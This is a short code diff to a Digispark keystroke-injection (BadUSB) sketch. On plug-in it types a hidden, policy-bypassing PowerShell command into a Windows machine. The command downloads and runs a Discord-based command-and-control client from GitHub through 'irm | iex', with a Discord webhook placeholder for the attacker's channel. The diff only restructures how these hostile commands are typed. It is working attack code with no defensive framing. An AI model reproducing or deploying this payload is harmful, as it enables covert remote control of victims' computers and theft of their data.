@@ -15,7 +15,11 @@ void loop(){
   DigiKeyboard.sendKeyStroke(21, MOD_GUI_LEFT);
   DigiKeyboard.delay(1000);
   
-  DigiKeyboard.print("powershell.exe -NonI -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE';");
+  DigiKeyboard.print("powershell.exe -NonI -NoP -Ep Bypass -W H");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(5000);
+  DigiKeyboard.print("$dc='WEBHOOK_HERE'; $gh='GITHUB_URL_HERE'");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.print("irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
